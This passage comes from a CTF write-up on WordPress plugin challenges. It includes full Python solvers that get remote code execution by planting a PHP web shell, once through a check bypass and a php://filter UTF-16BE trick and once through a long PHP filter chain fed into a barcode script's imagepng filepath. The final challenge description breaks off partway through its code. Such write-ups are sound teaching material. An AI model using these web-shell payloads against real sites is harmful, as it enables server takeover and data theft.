        
        $write = <<<EOF
            <?php
                exit('ha?');
                // $content

        EOF;

        file_put_contents($name . '.php', $write);
        return rest_ensure_response( "success" );
    }
    ```

To get RCE (Remote Code Execution), there are two things in the plugin we need to bypass. The first is the `$some_value` checker here:

```php
    $some_value = trim( strtolower( $request['somevalue'] ) );
    if( empty( $some_value ) ) {
       return false;
    }
 
    if( ! preg_match( '/^secretword_/i', $some_value) ) {
       return false;
    }
 
    if( $some_value == 'secretword_is_true' ) {
       return false;
    }
    return true;
    ...snip...
    $body = $request->get_json_params();
    $content = $body['content'];
    $name = $body['name'];
    $some_value = trim( strtolower( $request['somevalue'] ) );
    if(!get_option($some_value)){
        echo "blocked";
        exit(); 
    }

```

The second is the PHP `exit` here:

```php
    $write = <<<EOF
        <?php
            exit('ha?');
            // $content

    EOF;

    file_put_contents($name . '.php', $write);
    return rest_ensure_response( "success" );
```

For the first bypass, we can use the fact that parameters in the URL (`'/upload/(?P<somevalue>\w+)'`) can be passed via URL parameters, JSON, or the request body. Interestingly, it will match not only by its regex `\w+` but will match all its values. This behavior might be due to the plugin getting the `somevalue` by using an array (`$request['somevalue']`), which will get the value from URL parameters, JSON, or the request body. So, we just need to pass something like `\x01` in the `somevalue`, and it will bypass all the checks.

For the second bypass, we can use a PHP filter because we can directly influence the start of `file_put_contents` using `$name`. In this case, we will use UTF-8 to UTF-16BE, as shown in the solution below.

## Solver

```python
import httpx
import asyncio
URL = "http://52.77.81.199:9199/"
class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

class API(BaseAPI):
    async def upload_something(self, content: str, name: str) -> None:
        data = {
            "content": content,
            "name": name
        }
        return await self.c.post("/wp-json/test/upload/x", params={"somevalue": "secretword_is_true\x01"}, json=data)
    def get_shell(self, cmd):
        return self.c.get("/wp-content/uploads/x.php", params={"0": cmd})
async def main():
    api = API()
    res = await api.upload_something(
        content=b" <?php system($_GET[0]);?>".decode('utf-16-be'),
        name="php://filter/convert.iconv.UTF8.UTF-16BE/resource=/var/www/html/wp-content/uploads/x"
    )
    res = await api.get_shell("cat /*")
    print(res.text)

if __name__ == "__main__":
    asyncio.run(main())
 
```

### Flag

![](./imgs/image_dxH47Wup.png)

# **Sneaky**

| Solves | 5 |
| ------ | - |

Description

    You sneaky ...

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/c534e31b-0795-4183-a2e6-22588ecc2676/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RECGV65L%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T133645Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJGMEQCIFCRDphVlxaGYSci2ep1go%2B%2F33I%2B3LV%2Bs8U1ngwnvrk2AiADBjL0AFwPUtVN%2B8qm2oPlvhY2eObW6u6cFZ3FabEsyCqIBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM4jYuHhomn9xw95OzKtwDJFnCp6sP1G41ZEglO8m0MnVnwOTi13ns%2BtXuc9Ye6s5xJUx1XKVJ%2FtxfwvZ4mpry25VKJxcqHwzXXBQ9bh%2BWbCTIOhcZKgKEpdpgoCB7lQhG3et%2FO1JMbtyqV9IA2hGFTUuaXKLBKabb3winC8DbGiMBCY6pXPteq%2BjCVAckPdXX1vcoOLzxB6OrSm7LHvz58HOlzPkd2g09XYeMDCmwxb7L7pnSv%2Bkg%2FDXEWChtqocDcd0fvhWl2yxurXM1h6JfPy64FwVGqHRmtvPOaG%2BBm3pGN5rLy8iSScIUxGwcTv%2By2xzNXKGwK7hqpRmSTirF%2FfqN1CDMAxmH9BTOLH335Gnx2yif9k1whXLm2CDJ7djsr9bskf6sbQNFcfZCYoiZJZn9ODilmiPG%2FZvo0NIfrBgNijnN8pjoVQzirSGv6BY9os0FxFHcwk7cU8y5JtC5bAv0yeJMjGQ0oomnRlbKy1sXlflqhB4k3dKRxIa6c6BggB8NQd3qmrgGAXfWhvlTzqZ5msqGU%2BWawucbE8zJ2IgRqbz8WanxGLVoKAaKYKqgyuNYawQzHIpIVCvV2vwXmX2BGffHnWao%2BYcZ0ecSbtHukSRuYnRr6jOOiJy%2BWq878FR1COxJxiiFxMQwzPHBwQY6pgGhvIU7IaQreul5oZprVqEcA60uiVrkkwFgpSS%2BkQUT51xywWx6gL%2F2LBtzaxOzlvty2t2msGr1z0QTYtVhgcBm4oUaH0POD8l40tYOTO%2B7PoPXVpS3PMaMu3Vnb8eYuA6%2BcbWi2T4FCRSS3tdSGzJ0gNT0mghmr%2BasPT%2FhyVg9iB2SmUGYMNAaiqj6mN4ywYgp%2FOrFHpbc%2BGllSd2FeV2PRd0vkWPd&X-Amz-Signature=acb207afdc75bad67c5d6ec4dcc6c7a4bae45a40eb714287c7c03028bc7ccd42&X-Amz-SignedHeaders=host&x-id=GetObject)

References

    - [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

***

In this challenge, we will exploit a PHP filter chain in the `imagepng($image, $filename)` function, where the `$filename` is a variable that we can fully control.

When we look at the source code in `server-given/docker/wordpress/toolbox/plugins/mwb-point-of-sale-pos-for-woocommerce/package/lib/php-barcode-master/barcode.php`, we can see the following:

barcode.php

    ```php
    <?php
    /**
     *  Author  David S. Tufts
     *  Company davidscotttufts.com
     *
     *  Date:   05/25/2003
     *  Usage:  <img src="/barcode.php?text=testing" alt="testing" />
     *
     *  @package    Ultimate_Woocommerce_Gift_Card
     */

    /*
     For demonstration purposes, get pararameters that are passed in through $_GET or set to the default value. */
     $filepath = isset( $_GET['filepath'] ) ? $_GET['filepath']  : '';
     $text = isset( $_GET['text'] ) ? $_GET['text']  : '0';
     $size = isset( $_GET['size'] ) ? $_GET['size']  : '20';
     $orientation = isset( $_GET['orientation'] ) ? $_GET['orientation']  : 'horizontal';
     $code_type = isset( $_GET['codetype'] ) ? $_GET['codetype']  : 'code128';
     $print = isset( $_GET['print'] ) && ( 'true' == $_GET['print'] )  ? true : false;
     $sizefactor = isset( $_GET['sizefactor'] ) ? $_GET['sizefactor'] : '1';

    barcode( $filepath, $text, $size , $orientation , $code_type , $print , $sizefactor );
    /**
     * This function call can be copied into your project and can be made from anywhere in your code.
     *
     * @param string  $filepath Filepath.
     * @param string  $text Text.
     * @param string  $size Size.
     * @param string  $orientation Orientation.
     * @param string  $code_type Code Type.
     * @param boolean $print Print.
     * @param integer $size_factor Size factor.
     * @return void
     */
    function barcode( $filepath = '', $text = '0', $size = '20', $orientation = 'horizontal', $code_type = 'code128', $print = false, $size_factor = 1 ) {
    	$code_string = '';
    	// Translate the $text into barcode the correct $code_type.
    	if ( in_array( strtolower( $code_type ), array( 'code128', 'code128b' ) ) ) {
    		$chksum = 104;
    		// Must not change order of array elements as the checksum depends on the array's key to validate final code.
    		$code_array = array(
    			' ' => '212222',
    			'!' => '222122',
    			'"' => '222221',
    			'#' => '121223',
    			'$' => '121322',
    			'%' => '131222',
    			'&' => '122213',
    			"'" => '122312',
    			'(' => '132212',
    			')' => '221213',
    			'*' => '221312',
    			'+' => '231212',
    			',' => '112232',
    			'-' => '122132',
    			'.' => '122231',
    			'/' => '113222',
    			'0' => '123122',
    			'1' => '123221',
    			'2' => '223211',
    			'3' => '221132',
    			'4' => '221231',
    			'5' => '213212',
    			'6' => '223112',
    			'7' => '312131',
    			'8' => '311222',
    			'9' => '321122',
    			':' => '321221',
    			';' => '312212',
    			'<' => '322112',
    			'=' => '322211',
    			'>' => '212123',
    			'?' => '212321',
    			'@' => '232121',
    			'A' => '111323',
    			'B' => '131123',
    			'C' => '131321',
    			'D' => '112313',
    			'E' => '132113',
    			'F' => '132311',
    			'G' => '211313',
    			'H' => '231113',
    			'I' => '231311',
    			'J' => '112133',
    			'K' => '112331',
    			'L' => '132131',
    			'M' => '113123',
    			'N' => '113321',
    			'O' => '133121',
    			'P' => '313121',
    			'Q' => '211331',
    			'R' => '231131',
    			'S' => '213113',
    			'T' => '213311',
    			'U' => '213131',
    			'V' => '311123',
    			'W' => '311321',
    			'X' => '331121',
    			'Y' => '312113',
    			'Z' => '312311',
    			'[' => '332111',
    			'\\' => '314111',
    			']' => '221411',
    			'^' => '431111',
    			'_' => '111224',
    			'\`' => '111422',
    			'a' => '121124',
    			'b' => '121421',
    			'c' => '141122',
    			'd' => '141221',
    			'e' => '112214',
    			'f' => '112412',
    			'g' => '122114',
    			'h' => '122411',
    			'i' => '142112',
    			'j' => '142211',
    			'k' => '241211',
    			'l' => '221114',
    			'm' => '413111',
    			'n' => '241112',
    			'o' => '134111',
    			'p' => '111242',
    			'q' => '121142',
    			'r' => '121241',
    			's' => '114212',
    			't' => '124112',
    			'u' => '124211',
    			'v' => '411212',
    			'w' => '421112',
    			'x' => '421211',
    			'y' => '212141',
    			'z' => '214121',
    			'{' => '412121',
    			'|' => '111143',
    			'}' => '111341',
    			'~' => '131141',
    			'DEL' => '114113',
    			'FNC 3' => '114311',
    			'FNC 2' => '411113',
    			'SHIFT' => '411311',
    			'CODE C' => '113141',
    			'FNC 4' => '114131',
    			'CODE A' => '311141',
    			'FNC 1' => '411131',
    			'Start A' => '211412',
    			'Start B' => '211214',
    			'Start C' => '211232',
    			'Stop' => '2331112',
    		);
    		$code_keys = array_keys( $code_array );
    		$code_values = array_flip( $code_keys );
    		$text_length = strlen( $text );
    		for ( $x = 1; $x <= $text_length; $x++ ) {
    			$active_key = substr( $text, ( $x - 1 ), 1 );
    			$code_string .= $code_array[ $active_key ];
    			$chksum = ( $chksum + ( $code_values[ $active_key ] * $x ) );
    		}
    		$code_string .= $code_array[ $code_keys[ ( $chksum - ( intval( $chksum / 103 ) * 103 ) ) ] ];

    		$code_string = '211214' . $code_string . '2331112';
    	} elseif ( 'code128a' == strtolower( $code_type ) ) {
    		$chksum = 103;
    		$text = strtoupper( $text ); // Code 128A doesn't support lower case.
    		// Must not change order of array elements as the checksum depends on the array's key to validate final code.
    		$code_array = array(
    			' ' => '212222',
    			'!' => '222122',
    			'"' => '222221',
    			'#' => '121223',
    			'$' => '121322',
    			'%' => '131222',
    			'&' => '122213',
    			"'" => '122312',
    			'(' => '132212',
    			')' => '221213',
    			'*' => '221312',
    			'+' => '231212',
    			',' => '112232',
    			'-' => '122132',
    			'.' => '122231',
    			'/' => '113222',
    			'0' => '123122',
    			'1' => '123221',
    			'2' => '223211',
    			'3' => '221132',
    			'4' => '221231',
    			'5' => '213212',
    			'6' => '223112',
    			'7' => '312131',
    			'8' => '311222',
    			'9' => '321122',
    			':' => '321221',
    			';' => '312212',
    			'<' => '322112',
    			'=' => '322211',
    			'>' => '212123',
    			'?' => '212321',
    			'@' => '232121',
    			'A' => '111323',
    			'B' => '131123',
    			'C' => '131321',
    			'D' => '112313',
    			'E' => '132113',
    			'F' => '132311',
    			'G' => '211313',
    			'H' => '231113',
    			'I' => '231311',
    			'J' => '112133',
    			'K' => '112331',
    			'L' => '132131',
    			'M' => '113123',
    			'N' => '113321',
    			'O' => '133121',
    			'P' => '313121',
    			'Q' => '211331',
    			'R' => '231131',
    			'S' => '213113',
    			'T' => '213311',
    			'U' => '213131',
    			'V' => '311123',
    			'W' => '311321',
    			'X' => '331121',
    			'Y' => '312113',
    			'Z' => '312311',
    			'[' => '332111',
    			'\\' => '314111',
    			']' => '221411',
    			'^' => '431111',
    			'_' => '111224',
    			'NUL' => '111422',
    			'SOH' => '121124',
    			'STX' => '121421',
    			'ETX' => '141122',
    			'EOT' => '141221',
    			'ENQ' => '112214',
    			'ACK' => '112412',
    			'BEL' => '122114',
    			'BS' => '122411',
    			'HT' => '142112',
    			'LF' => '142211',
    			'VT' => '241211',
    			'FF' => '221114',
    			'CR' => '413111',
    			'SO' => '241112',
    			'SI' => '134111',
    			'DLE' => '111242',
    			'DC1' => '121142',
    			'DC2' => '121241',
    			'DC3' => '114212',
    			'DC4' => '124112',
    			'NAK' => '124211',
    			'SYN' => '411212',
    			'ETB' => '421112',
    			'CAN' => '421211',
    			'EM' => '212141',
    			'SUB' => '214121',
    			'ESC' => '412121',
    			'FS' => '111143',
    			'GS' => '111341',
    			'RS' => '131141',
    			'US' => '114113',
    			'FNC 3' => '114311',
    			'FNC 2' => '411113',
    			'SHIFT' => '411311',
    			'CODE C' => '113141',
    			'CODE B' => '114131',
    			'FNC 4' => '311141',
    			'FNC 1' => '411131',
    			'Start A' => '211412',
    			'Start B' => '211214',
    			'Start C' => '211232',
    			'Stop' => '2331112',
    		);
    		$code_keys = array_keys( $code_array );
    		$code_values = array_flip( $code_keys );
    		$text_length = strlen( $text );
    		for ( $x = 1; $x <= $text_length; $x++ ) {
    			$active_key = substr( $text, ( $x - 1 ), 1 );
    			$code_string .= $code_array[ $active_key ];
    			$chksum = ( $chksum + ( $code_values[ $active_key ] * $x ) );
    		}
    		$code_string .= $code_array[ $code_keys[ ( $chksum - ( intval( $chksum / 103 ) * 103 ) ) ] ];

    		$code_string = '211412' . $code_string . '2331112';
    	} elseif ( strtolower( $code_type ) == 'code39' ) {
    		$code_array = array(
    			'0' => '111221211',
    			'1' => '211211112',
    			'2' => '112211112',
    			'3' => '212211111',
    			'4' => '111221112',
    			'5' => '211221111',
    			'6' => '112221111',
    			'7' => '111211212',
    			'8' => '211211211',
    			'9' => '112211211',
    			'A' => '211112112',
    			'B' => '112112112',
    			'C' => '212112111',
    			'D' => '111122112',
    			'E' => '211122111',
    			'F' => '112122111',
    			'G' => '111112212',
    			'H' => '211112211',
    			'I' => '112112211',
    			'J' => '111122211',
    			'K' => '211111122',
    			'L' => '112111122',
    			'M' => '212111121',
    			'N' => '111121122',
    			'O' => '211121121',
    			'P' => '112121121',
    			'Q' => '111111222',
    			'R' => '211111221',
    			'S' => '112111221',
    			'T' => '111121221',
    			'U' => '221111112',
    			'V' => '122111112',
    			'W' => '222111111',
    			'X' => '121121112',
    			'Y' => '221121111',
    			'Z' => '122121111',
    			'-' => '121111212',
    			'.' => '221111211',
    			' ' => '122111211',
    			'$' => '121212111',
    			'/' => '121211121',
    			'+' => '121112121',
    			'%' => '111212121',
    			'*' => '121121211',
    		);

    		// Convert to uppercase.
    		$upper_text = strtoupper( $text );

    		$upper_text_length = strlen( $upper_text );
    		for ( $x = 1; $x <= $upper_text_length; $x++ ) {
    			$code_string .= $code_array[ substr( $upper_text, ( $x - 1 ), 1 ) ] . '1';
    		}

    		$code_string = '1211212111' . $code_string . '121121211';
    	} elseif ( strtolower( $code_type ) == 'code25' ) {
    		$code_array1 = array( '1', '2', '3', '4', '5', '6', '7', '8', '9', '0' );
    		$code_array2 = array( '3-1-1-1-3', '1-3-1-1-3', '3-3-1-1-1', '1-1-3-1-3', '3-1-3-1-1', '1-3-3-1-1', '1-1-1-3-3', '3-1-1-3-1', '1-3-1-3-1', '1-1-3-3-1' );

    		$text_length = strlen( $text );
    		$count_array1 = count( $code_array1 );
    		for ( $x = 1; $x <= $text_length; $x++ ) {
    			for ( $y = 0; $y < $count_array1; $y++ ) {
    				if ( substr( $text, ( $x - 1 ), 1 ) == $code_array1[ $y ] ) {
    					$temp[ $x ] = $code_array2[ $y ];
    				}
    			}
    		}

    		$text_length = strlen( $text );
    		for ( $x = 1; $x <= $text_length; $x += 2 ) {
    			if ( isset( $temp[ $x ] ) && isset( $temp[ ( $x + 1 ) ] ) ) {
    				$count_temp1 = count( $temp1 );
    				$temp1 = explode( '-', $temp[ $x ] );
    				$temp2 = explode( '-', $temp[ ( $x + 1 ) ] );
    				for ( $y = 0; $y < $count_temp1; $y++ ) {
    					$code_string .= $temp1[ $y ] . $temp2[ $y ];
    				}
    			}
    		}

    		$code_string = '1111' . $code_string . '311';
    	} elseif ( strtolower( $code_type ) == 'codabar' ) {
    		$code_array1 = array( '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '$', ':', '/', '.', '+', 'A', 'B', 'C', 'D' );
    		$code_array2 = array( '1111221', '1112112', '2211111', '1121121', '2111121', '1211112', '1211211', '1221111', '2112111', '1111122', '1112211', '1122111', '2111212', '2121112', '2121211', '1121212', '1122121', '1212112', '1112122', '1112221' );

    		// Convert to uppercase.
    		$upper_text = strtoupper( $text );
    		$upper_text_length = strlen( $upper_text );
    		for ( $x = 1; $x <= $upper_text_length; $x++ ) {
    			$count_array1 = count( $code_array1 );
    			for ( $y = 0; $y < $count_array1; $y++ ) {
    				if ( substr( $upper_text, ( $x - 1 ), 1 ) == $code_array1[ $y ] ) {
    					$code_string .= $code_array2[ $y ] . '1';
    				}
    			}
    		}
    		$code_string = '11221211' . $code_string . '1122121';
    	}

    	// Pad the edges of the barcode.
    	$code_length = 20;
    	if ( $print ) {
    		$text_height = 30;
    	} else {
    		$text_height = 0;
    	}

    	$code_string_length = strlen( $code_string );
    	for ( $i = 1; $i <= $code_string_length; $i++ ) {
    		$code_length = $code_length + (int) ( substr( $code_string, ( $i - 1 ), 1 ) );
    	}

    	if ( 'horizontal' == strtolower( $orientation ) ) {
    		$img_width = $code_length * $size_factor;
    		$img_height = $size;
    	} else {
    		$img_width = $size;
    		$img_height = $code_length * $size_factor;
    	}

    	$image = imagecreate( $img_width, $img_height + $text_height );
    	$black = imagecolorallocate( $image, 0, 0, 0 );
    	$white = imagecolorallocate( $image, 255, 255, 255 );

    	imagefill( $image, 0, 0, $white );
    	var_dump($print);
    	if ( $print ) {
    		imagestring( $image, 5, 31, $img_height, $text, $black );
    	}

    	$location = 10;
    	$code_string_length = strlen( $code_string );
    	for ( $position = 1; $position <= $code_string_length; $position++ ) {
    		$cur_size = $location + ( substr( $code_string, ( $position - 1 ), 1 ) );
    		if ( 'horizontal' == strtolower( $orientation ) ) {
    			imagefilledrectangle( $image, $location * $size_factor, 0, $cur_size * $size_factor, $img_height, ( 0 == $position % 2 ? $white : $black ) );
    		} else {
    			imagefilledrectangle( $image, 0, $location * $size_factor, $img_width, $cur_size * $size_factor, ( 0 == $position % 2 ? $white : $black ) );
    		}
    		$location = $cur_size;
    	}

    	// Draw barcode to the screen or save in a file.
    	if ( '' == $filepath ) {
    		header( 'Content-type: image/png' );
    		imagepng( $image );
    		imagedestroy( $image );
    	} else {
    		imagepng( $image, $filepath );
    		imagedestroy( $image );
    	}
    }

    ```

We can see that it uses a function named `barcode`, which in the end will save the file using the `imagepng` function. The file will be saved to our user-inputted variable named `$filename`. We can inject this `$filename` using a PHP filter chain to control its output. I use these tools to generate the filters:

> [![favicon](./imgs/favicon_f8fO6Cee.svg) **GitHub**](https://github.com/synacktiv/php_filter_chain_generator)\
> Contribute to synacktiv/php\_filter\_chain\_generator development by creating an account on GitHub.\
> <https://github.com/synacktiv/php_filter_chain_generator>

## Solver

solver.py

    ```python
    import httpx
    import asyncio

    URL = "http://52.77.81.199:9108/"
    class BaseAPI:
        def __init__(self, url=URL) -> None:
            self.c = httpx.AsyncClient(base_url=url)

        def qrcode(self, filepath: str = '', text: str = '0', size: str = '20', 
                   orientation: str = 'horizontal', code_type: str = 'code128', 
                   print_option: bool = False, sizefactor: str = '1') -> None:
            return self.c.get("/wp-content/plugins/mwb-point-of-sale-pos-for-woocommerce/package/lib/php-barcode-master/barcode.php", params={
                "filepath": filepath,
                "text": text,
                "size": size,
                "orientation": orientation,
                "codetype": code_type,
                "print": 'true' if print_option else 'false',
                "sizefactor": sizefactor
            })

    class API(BaseAPI):
        def shell(self, cmd):
            return self.c.get("/wp-content/uploads/koko-analytics/sss.php", params={"0": cmd})

    async def main():
        api = API()
        # python3 filter.py --chain "<?php system(\$_GET[0]);?>"
        x = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/var/www/html/wp-content/uploads/koko-analytics/sss.php"
        res = await api.qrcode(x, "xxx", print_option=False, code_type="code128a", size=1)
        res = await api.shell("cat /*")
        print(res.text)

    if __name__ == "__main__":
        asyncio.run(main())

    ```

### Flag

![](./imgs/image_gKss6j1t.png)

## Explanation

# **Up To You**

| Solves | 3 |
| ------ | - |

Description

    it's all up to you.

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/4c454296-d8a6-4eb2-abcc-0e74b46c41cc/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XQVF4CHP%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T133648Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJHMEUCIQCUim8fHmNJt2RKk7pxZHMQ6ynuinZwBm%2BMsLL25HIulgIgJPmDJOsBnkUyh9h%2FjcWSGiApQRFqOGVX%2BW3Sn%2BrL9nYqiAQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDIi3AS2CrqWipamRxyrcA8x%2Fpu1OnukFalEjqQsKm7oEWHp71%2FqZJgBsMOFUjrWllCE8%2FOTRh0UkcqbfBchChTkStTtDnLFwMVFQLsmw2wM9swKEegh8jK6hit7Nv6fdbGFQ%2FpXrsIXA0cJu0v84NXlNgpJVLBX4h1dRS%2BALfAhv%2BmomtTDkpXVR9VmW%2BiyYV%2FTumOWLeaEl6ME9p4XY0N8mElQCwzxgQYUmUuIVyRGREv%2FUurrwUxpPVHBDwoc8NvgS3kbPwj7feKjXFEXlKJ12VPNhv6Axdha6%2F4dnboprU65AToGH%2FvLFYP8wP4dGTsZlwgPmUnoZBbDGvU4A0xgqpPKrFNUsSuyyYbRjsOfX55%2F9dt%2FWExgBY3IQrtyJ0dWxSFBQEYn%2BgEHrbed9sckoaa2XNhtXLMBj1wPsS9JIHDx%2B1nmjM26%2Bjv7hkbmYHpVUa4%2FEqp69hbPKx9sjSzw9LMNrtcV6p1Wl97J3QpsfOGkC%2F51W2V%2F3tRxL4RJ3RDYKu6EON11ZIA6PcrVMNXl6oNJ0LsKKTWROi%2BZTgwWaKcat1cirJ02i7QZEZUxYgiO2W2zEnc3yIU8afxYDKbH0JDGlefcXR%2BaBGjiyNHPW0sugViQx3x606gGCyfNbqL6vuHEbeu7RAAqzMJPywcEGOqUBDTjL6uPcyFnRwI%2B9kB49GBzwtiTwDB6GmOoZiuo0uBNSi08mI%2BY8VdeH7Rw6eAfaGmAuySMxz2%2FlkJC%2B7EV9izl%2BCoeGd4AzLenMVgSg7u%2FCu46wKVE1k9%2F9I70mqX%2BvrLMzSE%2Fw9Iha69Gr2N%2FlUHdvHGq6RE5XU0oWL8vfQZCI3ZGgQRpglxDNsLLFcyGViCagOjPig%2F62ktwfPsfPC7H2CcKY&X-Amz-Signature=789e4c4fbe0b39f7684df5b884c5eba5cdd01e0d03c39b7a2d5ca5d512727763&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

In this challenge, we will exploit two vulnerabilities. The first one is a WordPress option update vulnerability, and the second one is an IDOR vulnerability.

For the first vulnerability, we can easily identify it by reading the plugin source code here:

test-plugin.php

    ```php
    add_action("wp_ajax_nopriv_uptoyou", "uptoyou");

    function uptoyou(){
        $option_name = $_POST["option_name"];
